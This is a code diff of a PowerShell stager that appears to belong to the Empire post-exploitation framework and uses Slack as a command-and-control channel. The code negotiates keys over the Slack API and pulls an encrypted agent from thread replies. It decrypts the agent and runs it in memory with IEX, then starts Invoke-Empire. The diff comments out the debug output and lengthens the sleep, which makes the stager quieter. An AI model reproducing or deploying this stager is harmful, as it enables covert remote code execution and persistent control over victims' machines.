@@ -152,13 +152,13 @@ function Start-Negotiate {
     $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
     $rc4p = $IV + $rc4p + $eb;
 
-    Write-Host "[*] Starting stage 3";
+    #Write-Host "[*] Starting stage 3";
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
     $rc4p_base64=[System.Net.WebUtility]::UrlEncode((Encode-Base64 $rc4p));
     $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p_base64&username=$($ID):3");
     $thread_ts=(ConvertFrom-Json20 $slack_response)["ts"];
 
-    Write-Host "[*] Thread timestamp is $thread_ts";
+    #Write-Host "[*] Thread timestamp is $thread_ts";
 
     # wait for listener to respond before proceeding
     $reply_count=0;
@@ -171,10 +171,10 @@ function Start-Negotiate {
         $slack_response2=ConvertFrom-Json20 $slack_response2;
         $reply_count=$($slack_response2["messages"][0]["reply_count"]);
 
-        Write-Host "[*] Reply count is $reply_count";
+        #Write-Host "[*] Reply count is $reply_count";
 
     }
-    Write-Host "[*] Listener has finished sending the base64 string.";
+    #Write-Host "[*] Listener has finished sending the base64 string.";
 
     # listener has replied grab all replies
     $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
@@ -185,10 +185,10 @@ function Start-Negotiate {
     $replies = $slack_response2["messages"] | ?{ $_["ts"] -ne $_["thread_ts"] };
     $raw_base64 = $replies["text"];
 
-    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+    #write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
     $raw=Decode-Base64 $raw_base64;
     if($raw) {
-        write-host "[*] cypher text decode from base64";
+        #write-host "[*] cypher text decode from base64";
     }
 
 
@@ -296,11 +296,11 @@ function Start-Negotiate {
         $slack_response=$wc.UploadString("https://slack.com/api/channels.replies","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&thread_ts=$thread_ts");
         $slack_response=ConvertFrom-Json20 $slack_response;
 
-        Write-Host "[*] Reply count is $($slack_response["messages"][0]["reply_count"])";
+        #Write-Host "[*] Reply count is $($slack_response["messages"][0]["reply_count"])";
 
         $last_message = $slack_response["messages"] | Select -Last 1;
         if($last_message["text"] -eq "-MESSAGE_END-") {
-            Write-Host "[*] Listener has finished sending the base64 string.";
+            #Write-Host "[*] Listener has finished sending the base64 string.";
             $listener_replied=$true;
         }
     }
@@ -313,23 +313,23 @@ function Start-Negotiate {
     $replies = $slack_response["messages"] | ?{ $_["ts"] -ne $_["thread_ts"] };
     $replies_end = $replies.count - 2;
     $raw_base64 = ($replies[0..$replies_end] | %{$_["text"]}) -join '';
-    write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+    #write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
     $raw=Decode-Base64 $raw_base64;
     if($raw) {
-        write-host "[*] cypher text decode from base64";
+        #write-host "[*] cypher text decode from base64";
     }
 
     # # decrypt the agent and register the agent logic
     $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
-    write-host "data len: $($Data.Length)";
+    #write-host "data len: $($Data.Length)";
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
     $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
 
-    # need to give slack 10 seconds else it buckles and you hit the rate limits
-    Start-Sleep -Seconds 10;
+    # need to give slack 20 seconds else it buckles and you hit the rate limits
+    Start-Sleep -Seconds 20;
 
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
